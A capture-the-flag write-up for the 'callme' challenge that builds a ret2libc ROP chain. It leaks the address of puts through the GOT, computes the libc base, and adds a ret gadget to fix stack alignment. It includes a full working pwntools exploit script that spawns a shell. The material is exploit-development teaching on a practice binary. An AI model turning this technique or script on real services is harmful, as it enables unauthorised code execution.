# callme Alternative Solution

There are no `system()` calls nor any `/bin/sh` strings in the application,
however we can find them at runtime, once `libc` has been loaded.

```
gdb ./callme
start

find "/bin/sh"
# Searching for '/bin/sh' in: None ranges
# Found 1 results, display max 1 items:
# libc : 0x7fa3151ee5bd --> 0x68732f6e69622f ('/bin/sh')

p *system
# $1 = {int (const char *)} 0x7fa31508c290 <__libc_system>
```

GDB disables ASLR per default, to enable it run `set disable-randomization off`.

In our exploit we can't depend on the addresses reported by GDB above, since
they are usually randomized every time the program is run.

But using `puts` or `printf`, we can print out the address of a known libc
function and then use that to calculate the base address at which libc is
loaded.

```python
payload = offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
```

We read the offset of `puts` from the global offset table (GOT):

```sh
readelf --relocs callme
#   Offset          Info           Type           Sym. Value    Sym. Name + Addend
# 000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
```

Then we pass this as the argument to a `puts` call, which will dereference it
and print out the actual address of the `puts` function.

By knowing the correct version of libc in use we can simply subtract the offset
(where in libc the function is located) from the leaked address (where in
memory it is loaded) to obtain the address where libc starts in our processes
memory.

```python
libc.address = leaked_addr - libc.symbols["puts"]
```

Finally, we can do our search for the `/bin/sh` string and the `system()`
function.

```python
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]

payload = offset + p64(pop_rdi) + p64(bin_sh) + p64(system)
```

However, the application crashes in `do_system()`, at a `movaps` instruction.
As we've learned in the previous challenges, a simple fix is to include
another `ret` instruction.

```python
payload = offset + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
```

Finally, we get a shell:

```
python3 exploit.py
# ... SNIP ...
[*] Switching to interactive mode
$ whoami
testikus
$ ls
callme    exploit.py        key2.dat  payload.txt
```

## Full Exploit Script

```python
#!/usr/bin/env python3
from pwn import *
context.bits = 64
context.arch = 'x86_64'

process_name = "./callme"
elf = ELF(process_name)
rop = ROP(elf)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

offset = b'A'*40
pop_rdi = 0x004009a3  # pop rdi; ret gadget
puts_got = 0x00601018 # puts@got
puts_plt = 0x004006d0 # puts@plt
#leave = 0x004008f0    # leave; ret gadget
ret = 0x004008f1      # ret gadget
main = 0x00400847     # main procedure

#p = process(process_name)
p = gdb.debug(process_name, '''
b *pwnme+89
''')

payload = offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
print(p.recvuntil("> "))
print(p.clean())
p.sendline(payload)
leaked_string = p.recvuntil("\ncallme")
received = leaked_string.replace(b"Thank you!\n", b"")
received = received.replace(b"\ncallme", b"")
leaked_addr = u64(received.ljust(8, b"\x00"))
libc.address = leaked_addr - libc.symbols["puts"]
print("libc base @ %s" % hex(libc.address))

bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]

# do_system uses the movaps instruction, which will fail on an unaligned stack.
# To realign the stack we include an additional ret in our rop-chain.
payload = offset + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)

print(p.clean())
p.sendline(payload)
print(p.clean())
p.interactive()

# with open("payload.txt", "wb") as f:
#     f.write(payload)

#p = process("./callme")
#p.send(payload)
#p.interactive()
```

I created most of this with some help from this great
[blog](https://pollevanhoof.be/nuggets/buffer_overflow_linux/3_aslr_ret2libc).

Note that in the linked article it is mentioned:

> We can now run our script inside a small bash loop and after a couple of
> crashes it should pop us a shell:
> `while ! ./exploit_ret2libc.py; do clear; done`

The reason why the program crashes sometimes instead of spawning a shell
seems to be caused by this line:

```python
recieved = leaked_string.replace(b"overflow me:", b"").strip()
```

Note the `strip()` at the end, `leaked_string` contains the `printf`/`puts`
address.
If that address ends (or starts) in a `0x20` this will be removed by the
`strip` call, since `0x20` also happens to be ASCII (space).

